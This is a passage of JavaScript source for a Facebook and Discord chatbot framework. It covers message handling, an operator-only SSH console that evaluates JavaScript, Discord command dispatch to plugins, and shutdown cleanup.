                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              }
              var argr = message.body.replace((/”/g), "\"")
                .replace((/“/g), "\"")
                .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
                .filter(function (el) {
                  return !(el == null || el == "" || el == " ");
                });
              argr.map(xy => xy.replace(/["]/g, ""));
              if (argr.indexOf("@everyone") != -1 && (global.config.allowEveryoneTagEvenBlacklisted || ((global
                .config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) || (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1
                ) && !Object.prototype.hasOwnProperty.call(global.config.blacklistedUsers, "FB-" + message
                  .senderID)))) {
                api.getThreadInfo(message.threadID, function (err, data) {
                  var participants = data.participantIDs;
                  var character = "@";
                  var sendString = "";
                  var mentionObj = [];
                  var i = 0;
                  for (var n in participants) {
                    sendString += character;
                    mentionObj.push({
                      tag: character,
                      id: participants[n],
                      fromIndex: i
                    });
                    i++;
                  }
                  api.sendMessage({
                    body: sendString,
                    mentions: mentionObj
                  }, message.threadID, function (err) {
                    if (err) {
                      log("[Facebook] @everyone errored:", err);
                    }
                  }, message.messageID, message.isGroup);
                });
              }
              try {
                let str = "";
                for (let n in message.attachments) {
                  let type = message.attachments[n].type;
                  type = type[0].toLocaleUpperCase() + type.substr(1);
                  str += "\r\n  <";
                  str += type;
                  str += " ";
                  switch (message.attachments[n].type) {
                    case "audio":
                    case "video":
                      // eslint-disable-next-line no-case-declarations
                      let dr = new Date(message.attachments[n].duration);
                      str += dr.getUTCHours()
                        .pad(2) + ":" + dr.getUTCMinutes()
                          .pad(2) + ":" + dr.getUTCSeconds()
                            .pad(2) + "." + dr.getUTCMilliseconds()
                              .pad(3);
                      str += " ";
                      if (message.attachments[n].type == "audio") break;
                    // eslint-disable-next-line no-fallthrough
                    case "photo":
                    case "animated_image":
                    case "sticker":
                      str += message.attachments[n].width;
                      str += "x";
                      str += message.attachments[n].height;
                      str += " ";
                  }
                  str += "| ";
                  str += message.attachments[n].url;
                  str += ">";
                }
                log(
                  "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                  "replied to", message.messageReply.senderID, "at", message.threadID + ":", message.body, str
                );
              } catch (ex) {
                log("[Facebook] ERROR on replymsg", message);
                fs.writeFileSync(
                  path.join(__dirname, 'logs', 'message-error-' + message.messageID + ".json"),
                  JSON.stringify(message, null, 4), {
                  mode: 0o666
                }
                );
              }
              break;
            default:
              break;
          }
        } else {
          log("[Facebook]", "Detected undefined!", err);
        }
      } catch (ex) {
        log("[Facebook]", ex, message);
      }
    });
    log("[Facebook]", "Started Facebook listener");
  };
  var fbloginobj = {};
  fbloginobj.email = global.config.fbemail;
  fbloginobj.password = global.config.fbpassword;
  if (global.config.usefbappstate && fs.existsSync(path.join(__dirname, "fbstate.json"))) {
    fbloginobj.appState = JSON.parse(fs.readFileSync(path.join(__dirname, "fbstate.json"), 'utf8'));
  }
  var configobj = {
    userAgent: global.config.fbuseragent,
    logLevel: global.config.DEBUG_FCA_LOGLEVEL,
    selfListen: true,
    listenEvents: true,
    updatePresence: false,
    autoMarkRead: false,
    autoMarkDelivery: false,
    forceLogin: false
  };
  if (global.config.facebookProxy != null) {
    if (global.config.facebookProxyUseSOCKS) {
      //configobj.proxy = "http://127.0.0.1:2813";
      configobj.proxy = `http://${sock2httpAddress == "0.0.0.0" ? "127.0.0.1" : sock2httpAddress}:${sock2httpPort}`;
    } else {
      configobj.proxy = "http://" + global.config.facebookProxy;
    }
  }
  try {
    log("[Facebook]", "Logging in...");
    var _fbinstance = require("fca-unofficial")(fbloginobj, configobj, facebookcb);
    var forceReconnect = function forceReconnect(error) {
      if (!error) {
        log("[Facebook]", "Destroying FCA instance and creating a new one...");
      }
      if (typeof facebook.listener == "object" && typeof facebook.listener.stopListening == "function") {
        facebook.listener.stopListening();
        log("[Facebook]", "Stopped Facebook listener");
      }
      if (typeof (facebook.api || {}).getAppState == "function") {
        var temporaryAppState = facebook.api.getAppState();
      } else {
        log("[Facebook]", "Cannot get appstate to reconnect (account not logged in?).");
        return;
      }
      try {
        clearInterval(facebook.removePendingClock);
        clearInterval(facebook.deliveryClock);
      } catch (ex) { }
      _fbinstance = null;
      delete require.cache[require.resolve("fca-unofficial")];
      _fbinstance = require("fca-unofficial")({
        appState: temporaryAppState
      }, configobj, facebookcb);
      log("[Facebook]", "New instance created.");
      log("[Facebook]", "Logging in...");
      setTimeout(function () {
        if (facebook.error && !facebook.listener) {
          log("[Facebook]", "Detected error. Attempting to reconnect...");
          forceReconnect(true);
        }
      }, 30000);
    };
    setInterval(forceReconnect, 64800000); //relogin every 18 hours
  } catch (ex) {
    log("[Facebook]", "Error found in codebase:", ex);
  }
}

var consoleHandle = function (message, SSH) {
  log("[INTERNAL]", `${SSH ? SSH : "CONSOLE"} issued javascript code:`, message);
  try {
    log(`[${SSH ? "SSH-" : ""}JAVASCRIPT]`, eval(message));
  } catch (ex) {
    log(`[${SSH ? "SSH-" : ""}JAVASCRIPT]`, ex);
  }
};
rl.on('line', function (message) {
  consoleHandle(message);
});
rl.setPrompt("console@c3c:js# ");
rl.prompt();

if (global.config.enableSSHRemoteConsole) {
  var ssh2 = require('ssh2');
  var hostkey = {};
  if (fs.existsSync(path.join(__dirname, "sshkey.json"))) {
    hostkey = JSON.parse(fs.readFileSync(path.join(__dirname, "sshkey.json"), {
      encoding: "utf8"
    }));
    log("[SSH]", "Loaded existing host key.");
  } else {
    hostkey = crypto.generateKeyPairSync('rsa', {
      modulusLength: 4096,
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs1',
        format: 'pem'
      }
    });
    fs.writeFileSync(path.join(__dirname, "sshkey.json"), JSON.stringify(hostkey));
    log("[SSH]", "Generated new host key.");
  }
  global.ssh2server = new ssh2.Server({
    hostKeys: [hostkey.privateKey]
  }, function connListener(client, conninfo) {
    log("[SSH]", conninfo.ip + ":" + conninfo.port, "connected with client named", conninfo.header.versions
      .software);
    client.on('authentication', function (ctx) {
      var user = ctx.username;
      if (user.length !== global.config.sshUsername.length || !(user == global.config.sshUsername)) {
        log(
          "[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with wrong username (", user,
          ")"
        );
        return ctx.reject([], false);
      }
      switch (ctx.method) {
        case 'password':
          var password = ctx.password;
          if (password.length === global.config.sshPassword.length && password == global.config.sshPassword) {
            return ctx.accept();
          } else {
            log("[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with wrong password.");
            return ctx.reject(["password"], false);
          }
        /* case 'publickey':
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with public keys, which is not supported.");
          return ctx.reject(); */
        default:
          log(
            "[SSH]", conninfo.ip + ":" + conninfo.port, "is authenticating with method:", ctx.method,
            ". Notifying client that a password is needed..."
          );
          return ctx.reject(["password"], true);
      }
    })
      .on('ready', function () {
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "authenticated successfully.");
        client.on('session', function (accept, _reject) {
          var session = accept();
          //SSH Shell
          session.once('shell', function (accept, _reject) {
            log("[SSH]", conninfo.ip + ":" + conninfo.port, "requested a shell (Remote Console).");
            global.sshstream[conninfo.ip + ":" + conninfo.port] = accept();
            global.sshstream[conninfo.ip + ":" + conninfo.port].write('\u001B[2J\u001B[0;0f');
            global.sshstream[conninfo.ip + ":" + conninfo.port].write(global.config.botname + " v" +
              version + (global.config.botname != "C3CBot" ? " (Powered by C3C)" : ""));
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("https://github.com/c3cbot/c3c-0x");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            var sshrl = readline.createInterface({
              input: global.sshstream[conninfo.ip + ":" + conninfo.port].stdin,
              output: global.sshstream[conninfo.ip + ":" + conninfo.port].stdout,
              terminal: true,
              prompt: ""
            });
            global.sshcurrsession[conninfo.ip + ":" + conninfo.port] = sshrl;
            sshrl.on('line', (message) => consoleHandle(message, conninfo.ip + ":" + conninfo.port));
            sshrl.setPrompt("ssh@c3c:js# ");
            sshrl.prompt();
            // process.stdout.pipe(stream, {end: false});
            // stream.pipe(process.stdin, {end: false});
          });

          session.on('pty', function (accept, _reject, info) {
            log(
              "[SSH]",
              conninfo.ip + ":" + conninfo.port,
              `requested PTY: ${info.cols}x${info.rows} (${info.width}x${info.height} px)`,
              Object.keys(info.modes).reduce((pv, cv) => {
                if (info.modes[cv]) {
                  if (pv == "") {
                    return cv;
                  }
                  return `${pv}, ${cv}`;
                }
                return pv;
              }, "")
            );
            accept();
          });

          session.on('window-change', function (accept, _reject, info) {
            log("[SSH]", conninfo.ip + ":" + conninfo.port, `changed PTY size: ${info.cols}x${info.rows} (${info.width}x${info.height} px)`);
          });

          session.on('signal', function (accept, _reject, info) {
            accept();
            process.emit(info.name);
          });
        });
      })
      .on('end', function () {
        delete global.sshcurrsession[conninfo.ip + ":" + conninfo.port];
        delete global.sshstream[conninfo.ip + ":" + conninfo.port];
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "disconnected.");
      })
      .on('error', function (err) {
        log("[SSH]", "ERR!", err);
        delete global.sshcurrsession[conninfo.ip + ":" + conninfo.port];
        delete global.sshstream[conninfo.ip + ":" + conninfo.port];
      });
  })
    .on('error', function (err) {
      log("[SSH]", "ERR!", err);
    })
    .listen(global.config.sshRemoteConsolePort, global.config.sshRemoteConsoleIP, function () {
      log("[SSH]", "Listening for SSH connection at", this.address()
        .address + ":" + this.address()
          .port);
    });
}
typeof global.data.cacheName != "object" ? global.data.cacheName = {} : "";
if (typeof global.data.cacheNameExpires != "object") {
  global.data.cacheNameExpires = {};
  var currTime = Date.now();
  for (var n in global.data.cacheName) {
    global.data.cacheNameExpires[n] = currTime + 604800000; //cacheName expires in 7 days.
  }
}
typeof global.data.everyoneTagBlacklist != "object" ? global.data.everyoneTagBlacklist = {} : "";
global.discordid = "Disabled";
if (global.config.enablediscord) {
  global.discordid = "Not logged in";
  var Discord = require('discord.js');
  global.Discord = Discord;
  client = new Discord.Client();
  client.on('ready', () => {
    log("[Discord]", "Logged in as", client.user.tag + ".");
    global.discordid = client.user.id;
  });
  client.on('error', error => {
    log("[Discord]", "Crashed with error: ", error);
    log("[Discord]", "Trying to reconnect... Some plugins might not work correctly.");
  });
  var discordMessageHandler = async function (message) {
    var nointernalresolve = false;
    var receivetime = new Date();

    let returnFunc = async function returnFunc(returndata) {
      if (typeof returndata == "object") {
        switch (returndata.handler) {
          case "internal":
            if (typeof returndata.data != "string") return { error: "Data must be a string." };
            try {
              return message.reply((returndata.data || "\u200B"), {
                split: true
              });
            } catch (ex) {
              return {
                error: ex
              };
            }
          case "internal-raw":
            if (global.getType(returndata.data) != "Object") return { error: "Data must be an object." };
            var body = returndata.data.body || "\u200B";
            delete returndata.data.body;
            returndata.data.split = true;
            try {
              return message.reply(body, returndata.data);
            } catch (ex) {
              return {
                err: ex
              };
            }
          default:
            return {
              error: `Invalid handler: ${returndata.handler}`
            };
        }
      } else if (typeof returndata != "undefined") {
        log("[Discord]", "Received an unknown response from plugin:", returndata);
      }
    };

    for (var n in global.chatHook) {
      if (global.chatHook[n].listenplatform & 2) {
        var chhandling = global.chatHook[n];
        if (chhandling.listentype == "everything") {
          let admin = false;
          if (global.config.admins.indexOf("DC-" + message.author.id) != -1) {
            admin = true;
          }
          if (
            global.getType(chhandling.resolverFunc) == "Function" ||
            global.getType(chhandling.resolverFunc) == "AsyncFunction"
          ) {
            let chdata = chhandling.resolverFunc("Discord", {
              time: receivetime,
              msgdata: { ...message },
              discordapi: client,
              // eslint-disable-next-line no-nested-ternary
              facebookapi: (typeof facebook == "object" ? (typeof facebook.api == "object" ? facebook
                .api : {}) : {}),
              prefix: prefix,
              admin: admin,
              // eslint-disable-next-line no-loop-func
              log: function logPlugin(...message) {
                log.apply(global, [
                  "[PLUGIN]",
                  "[" + String(chhandling.handler) + "]"
                ].concat(message));
              },
              return: returnFunc,
              resolvedLang: global.data.userLanguage[resolveID("Discord", { msgdata: message })] || global.config.language
            });
            // eslint-disable-next-line no-await-in-loop
            if (global.getType(chdata) == "Promise") chdata = await chdata;
            nointernalresolve = (nointernalresolve || chdata === true);
          }
        }
      }
    }
    if (message.content.startsWith(global.config.commandPrefix) && !nointernalresolve) {
      if (((global.config.discordlistenwhitelist && global.config.discordlisten.indexOf(message.channel.id) != -1) ||
        (!global.config.discordlistenwhitelist && global.config.discordlisten.indexOf(message.channel.id) == -1)) &&
        !message.author.bot && !(Array.prototype.indexOf.call(
          global.config.blacklistedUsers,
          ("DC-" + message.author.id)
        ) + 1)) {
        log(
          "[Discord]", message.author.id, "(" + message.author.tag + ")", "issued command in", message.channel.id +
          " (" + message.channel.name + "):",
          message.content,
          (message.attachments.size > 0 ? message.attachments : "")
        );
        var currenttime = new Date();
        let arg = message.content.replace((/”/g), "\"")
          .replace((/“/g), "\"")
          .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
          .filter(function (el) {
            return !(el == null || el == "" || el == " ");
          })
          .map(xy => xy.replace(/"/g, ""));

        let admin = false;
        for (var no in global.config.admins) {
          if (global.config.admins[no] == "DC-" + message.author.id) {
            admin = true;
          }
        }
        if (global.commandMapping[arg[0].substr(1)]) {
          if (!(global.commandMapping[arg[0].substr(1)].compatibly & 2) && global.commandMapping[arg[0].substr(1)]
            .compatibly != 0) {
            message.reply(getLang("UNSUPPORTED_INTERFACE", "DC-" + message.author.id));
          } else {
            global.data.cacheName["DC-" + message.author.id] = message.author.tag;
            var mentions = {};
            message.mentions.users.forEach(function (y, x) {
              mentions["DC-" + x] = y;
              global.data.cacheName["DC-" + x] = y.username + "#" + y.discrimator;
            });
            var returndata = {};
            try {
              if (facebook) {
                if (!facebook.api) {
                  facebook.api = {};
                }
              } else {
                facebook = {};
                facebook.api = {};
              }
              returndata = global.commandMapping[arg[0].substr(1)].scope("Discord", {
                args: JSON.parse(JSON.stringify(arg)),
                time: currenttime,
                msgdata: { ...message },
                prefix: prefix,
                admin: admin,
                mentions: mentions,
                discordapi: client,
                facebookapi: facebook.api,
                log: function logPlugin(...message) {
                  log.apply(global, [
                    "[PLUGIN]",
                    "[" + global.commandMapping[arg[0].substr(1)].handler + "]"
                  ].concat(message));
                },
                return: returnFunc,
                resolvedLang: global.data.userLanguage[resolveID("Discord", { msgdata: message })] || global.config.language,
                content: message.content
              });
              if (global.getType(returndata) == "Promise") returndata = await returndata;
            } catch (ex) {
              log("[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:", ex);
              returndata = {
                handler: "internal",
                data: "plerr: " + ex.stack
              };
            }
            returnFunc(returndata);
          }
        } else {
          if (!global.config.hideUnknownCommandMessage) {
            var nearest = require("./nearAPI.js").findBestMatch(
              arg[0].slice(global.config.commandPrefix.length),
              Object.keys(global.commandMapping)
                .filter(v => (admin || !global.commandMapping[v].adminCmd))
                .filter(v => ((global.commandMapping[v].compatibly & 2) || (global.commandMapping[v].compatibly == 0)))
            ).bestMatch;
            message.reply(getLang("UNKNOWN_CMD", "DC-" + message.author.id).replace("{0}", global.config.commandPrefix) + (nearest.rating >= 0.3 ? `\n\n${getLang("UNKNOWN_CMD_DIDYOUMEAN", "DC-" + message.author.id).replace("{0}", '`' + global.config.commandPrefix + nearest.target + '`')}` : ""));
          }
        }
      } else {
        log(
          "[Discord]", message.author.id, "(" + message.author.tag + ")", (message.channel instanceof Discord
            .DMChannel ? "DMed:" : "messaged in channel " + message.channel.id + " (" + message.channel.name + "):"
        ), message.content, (message.attachments.size > 0 ? message.attachments : "")
        );
      }
    } else {
      log(
        "[Discord]", message.author.id, "(" + message.author.tag + ")", (message.channel instanceof Discord
          .DMChannel ? "DMed:" : "messaged in channel " + message.channel.id + " (" + message.channel.name + "):"),
        message.content, (message.attachments.size > 0 ? message.attachments : "")
      );
    }
  };
  client.on('message', discordMessageHandler);
  log("[Discord]", "Logging in...");
  client.login(global.config.discordtoken);
  global.config.discordtoken = "<REDACTED>";
}
//Handling exit
var shutdownHandler = function (errorlevel) {
  log("[INTERNAL]", "Detected process is shutting down, handling...");
  //Stop Facebook listener
  if (facebook.listener) {
    facebook.listener.stopListening();
    try {
      clearInterval(facebook.removePendingClock);
      clearInterval(facebook.deliveryClock);
    } catch (ex) { }
    log("[Facebook]", "Stopped Facebook listener");
  }
  //Stop Discord listener and destroy Discord client
  if (global.config.enablediscord) {
    client.removeListener('message', discordMessageHandler);
    log("[Discord]", "Stopped Discord listener");
    client.destroy();
    log("[Discord]", "Logged out and destroyed client.");
  }
  //Stop auto-saving
  try {
    clearInterval(autosave);
    log("[INTERNAL]", "Stopped auto-save.");
  } catch (ex) {
    log("[INTERNAL]", ex);
  }
  //Unload all plugins 
  unloadPlugin();

  //Save for the last time
  if (testmode) {
    fs.writeFileSync(path.join(__dirname, "data-test.json"), JSON.stringify(global.data, null, 4), {
      mode: 0o666
    });
  } else {
    fs.writeFileSync(path.join(__dirname, "data.json"), JSON.stringify(global.data, null, 4), {
      mode: 0o666
    });
  }
  log("[INTERNAL]", "Saved data.");
  //Logout if don't use appstates
  if (!global.config.usefbappstate && typeof facebook.api == "object" && typeof facebook.api.logout == "function" &&
    facebookloggedIn) {
    var err = wait.for.callback(facebook.api.logout);
    log("[Facebook]", "Logged out.", err);
  }
  //Delete appstate if not logged in
  if (!facebookloggedIn) {
    fs.unlinkSync(path.join(__dirname, "fbstate.json"));
  }
  //Close SSH connections
  for (var conn in global.sshstream) {
    try {
      global.sshstream[conn].close();
    } catch (ex) {
      log("[SSH]", conn, "is already closed. Skipping...");
    }
  }

  //Stop local SOCK2HTTP
  if (typeof localSocksProxy != "undefined") {
    localSocksProxy.close();
    log("[INTERNAL]", "Closed local SOCKS2HTTP proxy.");
  }
  log("[INTERNAL]", "Closing bot with code " + errorlevel + "..." + "\x1b[m\r\n");
  rl.setPrompt("\x1b[m");
  console.log();
};
//Handle SIGINT and SIGTERM
var signalHandler = function (signal) {
  log("[INTERNAL]", signal, "detected, triggering exit function...");
  process.exit();
};
process.on('SIGTERM', () => signalHandler("SIGTERM")); //Ctrl+C but not on Windows?
process.on('SIGINT', function () {
  signalHandler("SIGINT");
}); //Ctrl+C?
process.on('SIGHUP', function () {
  signalHandler("SIGHUP");
}); //Windows Command Prompt close button?
rl.on('SIGTERM', () => process.emit('SIGINT'));
rl.on('SIGINT', () => process.emit('SIGINT'));
process.on('exit', shutdownHandler);

// CMv2 communicator

